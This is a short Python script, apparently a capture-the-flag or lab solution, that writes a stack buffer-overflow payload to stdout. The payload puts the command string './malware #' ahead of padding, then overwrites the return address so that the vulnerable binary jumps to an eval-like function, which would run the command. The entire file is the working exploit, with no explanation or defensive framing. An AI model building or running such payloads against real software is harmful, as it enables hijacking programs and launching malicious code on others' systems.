import sys
content = b'./malware #'


padding = b'A' * 29

ret_addr = b'\xf0\x12\x40\x00\x00\x00\x00\x00'

eval_addr = b'\x96\x11\x40\x00\x00\x00\x00\x00'

sys.stdout.buffer.write(content + padding + ret_addr + eval_addr)